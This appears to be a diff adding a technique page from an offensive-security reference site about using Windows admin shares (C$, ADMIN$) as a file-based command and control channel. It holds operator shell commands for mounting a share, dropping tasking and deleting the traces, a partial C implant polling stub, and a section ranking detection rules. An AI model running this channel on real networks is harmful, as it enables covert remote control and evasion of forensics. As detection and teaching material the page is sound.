@@ -1,0 +1,176 @@
+---
+title: SMB / Windows Admin Share C2
+mitre: T1021.002
+category: c2
+group: Covert Channels
+summary: Use admin shares and SMB file operations as a low-bandwidth command and control channel inside a LAN.
+platform: [Windows]
+tags: ['SMB', 'C2', 'Admin Shares', 'File Transfer']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: Authenticate to the admin share
+    desc: The implant uses NTLM or Kerberos to open C$, ADMIN$ or a custom share on a reachable host.
+    dll: mpr
+  - call: Write tasking to a file
+    desc: The operator places a command file in the share; the implant polls it with CreateFileW and ReadFile.
+    dll: kernel32
+  - call: Execute and write output
+    desc: The implant runs the task and writes the result to a second file in the same share.
+    dll: kernel32
+  - call: Clean up the task files
+    desc: Delete or truncate the task and output files to reduce the forensic residue on the share.
+    dll: kernel32
+detections:
+  - src: WINDOWS EID 5145
+    text: Access to C$, ADMIN$ or IPC$ from an account or source host that is not a known administrator or backup service.
+  - src: SYSMON EID 11
+    text: Frequent small file creates, reads and deletes inside an admin share from a remote account.
+  - src: SYSMON EID 23
+    text: A workstation opens an SMB share on a host that is not a file server or known C2 staging box.
+  - src: BEHAVIOURAL
+    text: A poll, read, write, delete cycle against the same share path at a constant beacon interval.
+related:
+  - mitre: T1071.002
+    title: SMB Named Pipe C2
+    desc: The pipe-based sibling; admin-share C2 moves bytes through files rather than named pipes.
+    href: /techniques/c2/smb-named-pipe
+  - mitre: T1071.001
+    title: HTTP Beaconing
+    desc: The out-of-band alternative; admin-share C2 stays inside the SMB-allowed segment.
+    href: /techniques/c2/http-beaconing
+  - mitre: T1550.002
+    title: Pass the Hash
+    desc: The credential technique that commonly funds the SMB authentication the channel relies on.
+    href: /techniques/credential-access/pass-the-hash
+  - mitre: T1071.004
+    title: LDAP C2
+    desc: Another in-LAN protocol channel; both avoid the perimeter egress path.
+    href: /techniques/c2/ldap-c2
+labKit:
+  - label: SMB share C2 toolkit
+    href: /lab
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Windows hosts expose administrative shares - `C$`, `ADMIN$`, `IPC$` and others - by default.
+They are the local-admin backdoor: any account with administrative rights on the machine can
+open them over SMB and read or write files as if it were sitting at the box. That same property
+makes them a command and control channel. An implant that can authenticate to a share on a
+reachable host does not need an open network port, a DNS name, or an outbound HTTP path; it needs
+a file it can poll and a file it can write to. Tasking goes in one file, output comes back in
+another, and the SMB audit log is the only trace.
+
+This is a low-bandwidth, in-LAN channel. It is the right choice when the target segment allows
+SMB but filters the protocols a normal beacon would use, or when the implant needs to stage
+larger payloads without standing up a listener. It is the wrong choice when the implant has a
+clean outbound path and the analyst is already watching SMB; the file operations leave a very
+specific audit signature that is easy to correlate into a beacon.
+
+<Callout type="caution">
+  Admin-share C2 is a file-based channel, so it inherits the file audit trail. Every open, read,
+  write and delete of the tasking files is an EID 5145 or a Sysmon file event. The channel is
+  quiet only in the sense that it does not open a port; it is not quiet in the sense that it does
+  not touch the filesystem. Operators who name the tasking files after ordinary temporary paths
+  and clean them up are reducing the residue, but they cannot remove the access events.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+The operator side is a share write and a share read. The implant side is a poll loop that checks
+for a task file, runs it, and writes the result back. The whole channel is file I/O over an
+authenticated SMB session.
+
+<CodeBlock
+  file="share_c2.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# operator: connect to the admin share on the staging host
+$ net use \\\\10.10.10.20\\C$ /user:CORP\\svc-backup
+The command completed successfully.
+
+# operator: drop a tasking file
+$ echo whoami > C:\\Temp\\.u\\task.txt
+$ copy C:\\Temp\\.u\\task.txt \\\\10.10.10.20\\C$\\Windows\\Temp\\.u\\task.txt
+
+# operator: read the output the implant wrote back
+$ type \\\\10.10.10.20\\C$\\Windows\\Temp\\.u\\out.txt
+corp\\jsmith
+
+# operator: clean up so the next poll starts from a blank state
+$ del \\\\10.10.10.20\\C$\\Windows\\Temp\\.u\\task.txt
+$ del \\\\10.10.10.20\\C$\\Windows\\Temp\\.u\\out.txt`}
+/>
+
+The implant side is a tight poll-and-run loop. It needs no network library beyond the SMB client;
+the channel is the filesystem it already has access to.
+
+<CodeBlock
+  file="implant_stub.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// poll the tasking file on the admin share
+// open, read, execute, write the result, delete both files
+HANDLE h = CreateFileW(
+    L"\\\\10.10.10.20\\C$\\Windows\\Temp\\.u\\task.txt",
+    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
+DWORD n;
+ReadFile(h, buf, sizeof buf, &n, NULL);
+CloseHandle(h);
+
+// run buf as a command, capture stdout into out
+// write out to \\\\\\<host>\\C$\\Windows\\Temp\\.u\\out.txt
+// delete task.txt and out.txt, sleep, repeat  <-- the beacon`}
+/>
+
+## Verifying in the lab
+
+From a workstation with admin rights on a second host, connect to the second host's `C$` share,
+drop a tasking file, and confirm the implant on that host picks it up, runs it, and writes the
+result back. The proof is the output file appearing in the share with no other channel open.
+
+<CodeBlock
+  file="lab_check"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# on the staging host, the output file is the artifact
+> dir C:\\Windows\\Temp\\.u\\out.txt
+out.txt   12  Sep 04 09:30  out.txt  <-- the artifact
+
+# on the implant host, the access events are the network artifact
+# EID 5145: C$\\Windows\\Temp\\.u\\task.txt opened by CORP\\svc-backup
+# EID 5145: C$\\Windows\\Temp\\.u\\out.txt written and read     <-- the artifact`}
+/>
+
+## Detection
+
+The channel is defined by its file operations, so the file audit trail is the detection surface.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the EID 5145 rule on the admin shares is the cheapest continuous control and catches
+both the operator's write and the implant's poll. The poll-read-write-delete behavioural rule is
+the highest-fidelity beacon detection, because it matches the channel's actual cadence rather than
+a single file access. The EID 23 share-connection rule is the setup catch and is the one to pair
+with a host-role baseline of which machines are expected to serve SMB shares.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
